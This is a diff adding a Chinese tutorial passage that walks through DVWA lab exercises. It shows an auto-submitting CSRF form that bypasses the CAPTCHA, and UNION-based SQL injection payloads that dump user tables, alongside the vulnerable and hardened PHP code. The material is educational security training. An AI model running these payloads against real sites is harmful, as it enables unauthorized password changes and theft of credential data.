+依然可以实施 CSRF 攻击，攻击页面代码如下。
+```
+<html>
+
+<body onload="document.getElementById('transfer').submit()">
+
+  <div>
+
+    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">
+
+		<input type="hidden" name="password_new" value="password">
+
+		<input type="hidden" name="password_conf" value="password">
+
+        <input type="hidden" name="passed_captcha" value="true">
+
+		<input type="hidden" name="step" value="2"
+
+		<input type="hidden" name="Change" value="Change">
+
+	</form>
+
+  </div>
+
+</body>
+
+</html>
+```
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Change' ] ) ) {
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_conf = $_POST[ 'password_conf' ];
+
+	// Check CAPTCHA from 3rd party
+	$resp = recaptcha_check_answer(
+		$_DVWA[ 'recaptcha_private_key' ],
+		$_POST['g-recaptcha-response']
+	);
+
+	if (
+		$resp || 
+		(
+			$_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
+			&& $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
+		)
+	){
+		// CAPTCHA was correct. Do both new passwords match?
+		if ($pass_new == $pass_conf) {
+			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+			$pass_new = md5( $pass_new );
+
+			// Update database
+			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
+			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+			// Feedback for user
+			$html .= "<pre>Password Changed.</pre>";
+
+		} else {
+			// Ops. Password mismatch
+			$html     .= "<pre>Both passwords must match.</pre>";
+			$hide_form = false;
+		}
+
+	} else {
+		// What happens when the CAPTCHA was entered incorrectly
+		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
+		$hide_form = false;
+		return;
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+可以看到，服务器的验证逻辑是当 $resp（这里是指谷歌返回的验证结果）是 false，并且参数 recaptcha_response_field 不等于 hidd3n_valu3（或者 http 包头的 User-Agent 参数不等于 reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。
+
+**漏洞利用**
+
+搞清楚了验证逻辑，剩下就是伪造绕过了，由于 $resp 参数我们无法控制，所以重心放在参数 recaptcha_response_field、User-Agent 上。
+
+第一步依旧是抓包
+
+![image](../../../img/渗透/实验/dvwa40.png)
+
+更改参数 recaptcha_response_field 以及 http 包头的 User-Agent
+
+![image](../../../img/渗透/实验/dvwa41.png)
+
+注:在最新版的 dvwa 中这里要改成 `g-recaptcha-response=hidd3n_valu3`
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Change' ] ) ) {
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_new  = stripslashes( $pass_new );
+	$pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass_new  = md5( $pass_new );
+
+	$pass_conf = $_POST[ 'password_conf' ];
+	$pass_conf = stripslashes( $pass_conf );
+	$pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass_conf = md5( $pass_conf );
+
+	$pass_curr = $_POST[ 'password_current' ];
+	$pass_curr = stripslashes( $pass_curr );
+	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass_curr = md5( $pass_curr );
+
+	// Check CAPTCHA from 3rd party
+	$resp = recaptcha_check_answer(
+		$_DVWA[ 'recaptcha_private_key' ],
+		$_POST['g-recaptcha-response']
+	);
+
+	// Did the CAPTCHA fail?
+	if( !$resp ) {
+		// What happens when the CAPTCHA was entered incorrectly
+		$html .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
+		$hide_form = false;
+		return;
+	}
+	else {
+		// Check that the current password is correct
+		$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+		$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+		$data->execute();
+
+		// Do both new password match and was the current password correct?
+		if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
+			// Update the database
+			$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+			$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
+			$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+			$data->execute();
+
+			// Feedback for the end user - success!
+			$html .= "<pre>Password Changed.</pre>";
+		}
+		else {
+			// Feedback for the end user - failed!
+			$html .= "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
+			$hide_form = false;
+		}
+	}
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+
+可以看到，Impossible 级别的代码增加了 Anti-CSRF token 机制防御 CSRF 攻击，利用 PDO 技术防护 sql 注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。
+
+---
+
+## SQL Injection
+SQL Injection，即 SQL 注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意 SQL 语句的目的。SQL 注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL 注入仍是现在最常见的Web漏洞之一。
+
+**手工注入思路**
+
+自动化的注入神器 sqlmap 固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。
+```
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解SQL查询语句中的字段数
+3.确定显示的字段顺序
+4.获取当前数据库
+5.获取数据库中的表
+6.获取表中的字段名
+7.下载数据
+```
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+	// Get input
+	$id = $_REQUEST[ 'id' ];
+
+	// Check database
+	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+	// Get results
+	while( $row = mysqli_fetch_assoc( $result ) ) {
+		// Get values
+		$first = $row["first_name"];
+		$last  = $row["last_name"];
+
+		// Feedback for end user
+		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+	}
+
+	mysqli_close($GLOBALS["___mysqli_ston"]);
+}
+
+?>
+```
+可以看到，Low 级别的代码对来自客户端的参数 id 没有进行任何的检查与过滤，存在明显的 SQL 注入。
+
+**漏洞利用**
+1. 判断是否存在注入，注入是字符型还是数字型
+
+    输入 `1`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa42.png)
+
+    输入 `1'and '1' ='2`，查询失败，返回结果为空：
+
+    ![image](../../../img/渗透/实验/dvwa43.png)
+
+    输入 `1'or '1'='1`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa44.png)
+
+    返回了多个结果，说明存在字符型注入。
+
+    注: 关于数字型，字符型，搜索型的区别可以参考如下文章:https://blog.csdn.net/change518/article/details/8116920
+
+2. 猜解SQL查询语句中的字段数
+
+    输入 `1' or 1=1 order by 1 #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa45.png)
+
+    输入 `1' or 1=1 order by 2 #`，查询成功
+    输入 `1' or 1=1 order by 3 #`，查询失败：
+
+    ![image](../../../img/渗透/实验/dvwa46.png)
+
+    说明执行的 SQL 查询语句中只有两个字段，即这里的 First name、Surname。
+    （这里也可以通过输入 union select 1,2,3… 来猜解字段数）
+
+3. 确定显示的字段顺序
+
+    输入 `1' union select 1,2 #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa47.png)
+
+    说明执行的 SQL 语句为 select First name,Surname from 表 where ID=’id’…
+
+4. 获取当前数据库
+
+    输入 `1' union select 1,database() #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa48.png)
+
+    说明当前的数据库为 dvwa。
+
+5. 获取数据库中的表
+
+    输入 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa49.png)
+
+    说明数据库 dvwa 中一共有两个表，guestbook 与 users。
+
+6. 获取表中的字段名
+
+    输入 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa50.png)
+
+    说明 users 表中有8个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
+
+7. 下载数据
+
+    输入`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa51.png)
+
+    这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据。
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Submit' ] ) ) {
+	// Get input
+	$id = $_POST[ 'id' ];
+
+	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+
+	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
+
+	// Get results
+	while( $row = mysqli_fetch_assoc( $result ) ) {
+		// Display values
+		$first = $row["first_name"];
+		$last  = $row["last_name"];
+
+		// Feedback for end user
+		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+	}
+
+}
+
+// This is used later on in the index.php page
+// Setting it here so we can close the database connection in here like in the rest of the source scripts
+$query  = "SELECT COUNT(*) FROM users;";
+$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+$number_of_rows = mysqli_fetch_row( $result )[0];
+
+mysqli_close($GLOBALS["___mysqli_ston"]);
+?>
+```
+
+可以看到，Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 `\x00,\n,\r,\,’,”,\x1a` 进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。
+
+**漏洞利用**
+
+虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。
+
+1. 判断是否存在注入，注入是字符型还是数字型
+
+    抓包更改参数 id 为 `1' or 1=1`,报错
+    抓包更改参数 id 为 `1 or 1=1 #`，查询成功
+
+    ![image](../../../img/渗透/实验/dvwa52.png)
+
+    说明存在数字型注入。由于是数字型注入，服务器端的 mysql_real_escape_string 函数就形同虚设了，因为数字型注入并不需要借助引号。
+
+2. 猜解 SQL 查询语句中的字段数
+
+    抓包更改参数 id 为 `1 order by 2 #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa53.png)
+
+    抓包更改参数 id 为 `1 order by 3 #`，报错,说明执行的SQL查询语句中只有两个字段，即这里的 First name、Surname。
+
+3. 确定显示的字段顺序
+
+    抓包更改参数 id 为 `1 union select 1,2 #`，查询成功：
+
+    ![image](../../../img/渗透/实验/dvwa54.png)
+
+    说明执行的SQL语句为 `select First name,Surname from 表 where ID=id…`
+
+4. 获取当前数据库
+
+    抓包更改参数 id 为 `1 union select 1,database() #`
+
+5. 获取数据库中的表
+
+    抓包更改参数 id 为 `1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
+
+6. 获取表中的字段名
+
+    抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` ,查询失败
+
+    ![image](../../../img/渗透/实验/dvwa55.png)
+
+    这是因为单引号被转义了，变成了 `\’`。
+
+    可以利用 16 进制进行绕过，抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`
+
+    ![image](../../../img/渗透/实验/dvwa56.png)
+
+    说明 users 表中有 8 个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
+
+7. 下载数据
+
+    抓包修改参数 id 为 `1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_SESSION [ 'id' ] ) ) {
+	// Get input
+	$id = $_SESSION[ 'id' ];
+
+	// Check database
+	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
+
+	// Get results
+	while( $row = mysqli_fetch_assoc( $result ) ) {
+		// Get values
+		$first = $row["first_name"];
+		$last  = $row["last_name"];
+
+		// Feedback for end user
+		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+可以看到，与 Medium 级别的代码相比，High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，希望以此控制只输出一个结果。
+
+**漏洞利用**
+
+虽然添加了 LIMIT 1，但是我们可以通过 `#` 将其注释掉。由于手工注入的过程与 Low 级别基本一样，直接最后一步演示下载数据。
+
+输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ，查询成功：
+
+![image](../../../img/渗透/实验/dvwa57.png)
+
+需要特别提到的是，High 级别的查询提交页面与查询结果显示页面不是同一个，也没有执行 302 跳转，这样做的目的是为了防止一般的 sqlmap 注入，因为 sqlmap 在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+	// Get input
+	$id = $_GET[ 'id' ];
+
+	// Was a number entered?
+	if(is_numeric( $id )) {
+		// Check the database
+		$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+		$data->bindParam( ':id', $id, PDO::PARAM_INT );
+		$data->execute();
+		$row = $data->fetch();
+
+		// Make sure only 1 result is returned
+		if( $data->rowCount() == 1 ) {
+			// Get values
+			$first = $row[ 'first_name' ];
+			$last  = $row[ 'last_name' ];
+
+			// Feedback for end user
+			$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+		}
+	}
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+
+可以看到，Impossible 级别的代码采用了 PDO 技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken 机制的加入了进一步提高了安全性。
+
+---
+
+## SQL Injection(Blind)
+
+SQL Injection（Blind），即 SQL 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注。
+
+**手工盲注思路**
+
+手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。
+
+盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。
+
+下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：
+```
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解当前数据库名
+3.猜解数据库中的表名
+4.猜解表中的字段名
+5.猜解数据
+```
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+	// Get input
+	$id = $_GET[ 'id' ];
+
+	// Check database
+	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
+
+	// Get results
+	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
+	if( $num > 0 ) {
+		// Feedback for end user
+		$html .= '<pre>User ID exists in the database.</pre>';
+	}
+	else {
+		// User wasn't found, so the page wasn't!
+		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+		// Feedback for end user
+		$html .= '<pre>User ID is MISSING from the database.</pre>';
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+
+可以看到，Low 级别的代码对参数 id 没有做任何检查、过滤，存在明显的 SQL 注入漏洞，同时 SQL 语句查询返回的结果只有两种，`User ID exists in the database.`与`User ID is MISSING from the database.` 因此这里是 SQL 盲注漏洞。
+
+**漏洞利用**
+- **基于布尔的盲注**
+
+    1. 判断是否存在注入，注入是字符型还是数字型
+
+        输入`1`，显示相应用户存在
+
+        输入`1' and 1=1 #`，显示存在
+
+        输入`1' and 1=2 #`，显示不存在
+
+        说明存在字符型的SQL盲注。
 
 
 
 
-https://www.freebuf.com/articles/web/119150.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+http://www.storysec.com/dvwa-file-upload.html
 
 http://www.storysec.com/dvwa-sql-injection.html
 
@@ -968,7 +2227,7 @@ https://blog.csdn.net/nzjdsds/article/details/81814066
 
 
 
-https://www.freebuf.com/author/lonehand
+
 http://www.storysec.com/dvwa-sql-injection.html
 
 
